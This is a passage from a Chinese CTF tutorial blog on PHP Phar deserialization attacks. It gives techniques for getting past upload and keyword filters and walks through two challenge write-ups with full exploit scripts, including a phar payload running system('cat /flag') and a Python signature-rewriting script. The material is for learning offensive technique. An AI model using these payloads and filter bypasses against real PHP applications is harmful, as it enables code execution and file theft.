class="hljs-variable">$filename</span>) ? <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>) : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;foo.txt&quot;</span>,<span class="hljs-string">&quot;bar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>正常情况下应该是会给我们提供文件上传的功能点，这里我没有写，但是可以直接利用，payload 为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=phar:<span class="hljs-comment">//poc.phar&amp;1=phpinfo();</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355080403-d442aea9-0449-4431-8ad5-a244651e697b.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355080403-d442aea9-0449-4431-8ad5-a244651e697b.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h2 id="0x03-Phar-反序列化-Bypass-的攻防二相性"><a href="#0x03-Phar-反序列化-Bypass-的攻防二相性" class="headerlink" title="0x03 Phar 反序列化 Bypass 的攻防二相性"></a>0x03 Phar 反序列化 Bypass 的攻防二相性</h2><h3 id="对-Phar-内文件检测白名单"><a href="#对-Phar-内文件检测白名单" class="headerlink" title="对 Phar 内文件检测白名单"></a>对 Phar 内文件检测白名单</h3><p>我们利用Phar反序列化的第一步就是需要上传Phar文件到[服务器]，而如果服务端存在防护，比如这种</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/gif&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的 bypass 比较简单，核心语句是这个</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">$phar-&gt;setStub(&quot;GIF89a</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure>
+
+<p>这和上面例题所说的 exp 是一样的</p>
+<h3 id="绕过-Phar-等关键字检测"><a href="#绕过-Phar-等关键字检测" class="headerlink" title="绕过 Phar 等关键字检测"></a>绕过 Phar 等关键字检测</h3><p>Phar反序列化中，我们一般思路是上传Phar文件后，通过给参数赋值为Phar:&#x2F;&#x2F;xxx来实现反序列化，而一些防护可能会采取禁止参数开头为Phar等关键字的方式来防止Phar反序列化，示例代码如下</p>
+<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">if (preg_match(&quot;/</span><span class="hljs-keyword">^php</span><span class="language-xml">|</span><span class="hljs-keyword">^file</span><span class="language-xml">|</span><span class="hljs-keyword">^phar</span><span class="language-xml">|</span><span class="hljs-keyword">^dict</span><span class="language-xml">|</span><span class="hljs-keyword">^zip</span><span class="language-xml">/i&quot;,</span><span class="hljs-variable">$filename</span><span class="language-xml">)&#123;</span><br><span class="language-xml">    die();</span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们的办法是使用各种协议来进行绕过，具体如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phar:<span class="hljs-regexp">//</span>test.phar<br><span class="hljs-regexp">//</span>即使用filter伪协议来进行绕过<br><span class="hljs-number">2</span>、compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用bzip2协议来进行绕过<br><span class="hljs-number">3</span>、compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br><span class="hljs-regexp">//</span>使用zlib协议进行绕过<br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过-HALT-COMPILER-检测"><a href="#绕过-HALT-COMPILER-检测" class="headerlink" title="绕过 __HALT_COMPILER 检测"></a>绕过 __HALT_COMPILER 检测</h3><p>我们在前文初识Phar时就提到过，PHP 通过 __HALT_COMPILER来识别 Phar 文件，那么出于安全考虑，即为了防止 Phar 反序列化的出现，可能就会对这个进行过滤，示例代码如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-title function_">preg_match</span>(<span class="hljs-params"><span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,$Phar</span>)&#123;<br>    <span class="hljs-title function_">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的话绕过思路有两个 1、将 Phar 文件的内容写到压缩包注释中，压缩为 zip 文件，示例代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>2、将生成的Phar文件进行gzip压缩，压缩命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip test.phar<br></code></pre></td></tr></table></figure>
+
+<p>压缩后同样也可以进行反序列化</p>
+<h2 id="0x04-实战例题"><a href="#0x04-实战例题" class="headerlink" title="0x04 实战例题"></a>0x04 实战例题</h2><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><ul>
+<li>首先通过正常的登录注册业务进到正常的逻辑当中去，发现有个文件上传的业务点。</li>
+</ul>
+<p>上传 shell.jpeg 可以上传成功，并且存在下载与删除的业务</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355085202-3d2f595f-c4c3-474e-9e61-664ebcaa52a9.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085202-3d2f595f-c4c3-474e-9e61-664ebcaa52a9.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>但是目前无法确定 shell.jpeg 的路径保存在何处，所以我们先看看下载的业务，这里是存在任意文件读取的漏洞的，如图</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355085174-f182e888-7cd9-4a2d-987c-908d68b4223b.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085174-f182e888-7cd9-4a2d-987c-908d68b4223b.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>猜测路径 filename&#x3D;&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php 这里读取到了文件上传的源码，同样，下载和删除应该也有源码，读一下，且包含了 class.php，都逐一读取一遍。</p>
+<p>但是这里 $_SESSION[‘sandbox’] 不知道是什么，所以并不是一道单纯的文件上传的题目。</p>
+<p>在读取 class.php 的时候，发现最后 close() 函数调用了 file_get_contents() 函数，这个函数我们之前提过，很有可能是一个 Phar 反序列化的题目。且题目并没有过滤 phar 后缀的文件，修改 MIME 绕过即可</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355085340-ccd44dd2-4259-401c-8913-bb7e76de2611.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085340-ccd44dd2-4259-401c-8913-bb7e76de2611.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>所以这里我们需要先找链子，危险函数是 class.php#close()，发现是 download.php#echo $file-&gt;close(); 调用了它，所以下载处应该是对应的漏洞入口。</p>
+<ul>
+<li>接下来就是构造 EXP</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$a</span>-&gt;filename=<span class="hljs-string">&quot;/f*&quot;</span>;<br><span class="hljs-variable">$tttang</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;drunkbaby.phar&#x27;</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始缓冲 Phar 写操作</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot; &quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是我用这个打失败了，并且发现 download 这个包抓不到，所以应该是要换思路了。</p>
+<p>发现 delete.php User 类的 __destruct() 魔术方法也同样调用了 close() 方法，和 Java 反射的思想差不多，这里把 $db 修改成 File 类即可攻击，构造 EXP，中间需要用 FileList 这个类来过渡，因为这里需要最后输出结果用，只是用 File 类的话是没办法把 flag 在前端打印出来的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filelist</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; files = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>());<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag.txt&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;poc.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&#x27;poc.phar&#x27;</span>,<span class="hljs-string">&#x27;poc.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后 delete 的功能点直接利用</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355085715-fc3d1c2b-82e2-4aaa-bb46-9ccfe0b5f7aa.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085715-fc3d1c2b-82e2-4aaa-bb46-9ccfe0b5f7aa.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h3 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h3><ul>
+<li>不太舒服，因为要自己编辑 PHP 文件，先读取文件</li>
+</ul>
+<p>最后整理出来的源码如下</p>
+<p><strong>index.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>upload.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>大致就是，要检查后缀并检查内容，且会检查 phar 文件的内容，这一步其实很容易 bypass，通过前面讲的，gzip 压缩就好。</p>
+<p>接着分析题目，先写 EXP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;poc.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoveNss</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里很明显要 bypass __wakeup() 魔术方法，但是如果只是修改内容是不行的，还需要修改签名，这就是前面说的内容。</p>
+<p>总的来说就是以下四步</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、更改属性值来绕过 __wakeup 函数<br><span class="hljs-number">2</span>、更改签名<br><span class="hljs-number">2</span>、进行 gzip 压缩来绕过关键字检测<br><span class="hljs-number">4</span>、更改文件后缀<br></code></pre></td></tr></table></figure>
+
+<p><strong>sign.py</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">import gzip<br><span class="hljs-keyword">from</span> hashlib import sha1<br>with <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;poc.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.<span class="hljs-title function_ invoke__">read</span>()<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>s = s.<span class="hljs-title function_ invoke__">replace</span>(b<span class="hljs-string">&#x27;3:&#123;&#x27;</span>, b<span class="hljs-string">&#x27;4:&#123;&#x27;</span>)<span class="hljs-comment">#更换属性值，绕过__wakeup</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>newf = s + <span class="hljs-title function_ invoke__">sha1</span>(s).<span class="hljs-title function_ invoke__">digest</span>() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + 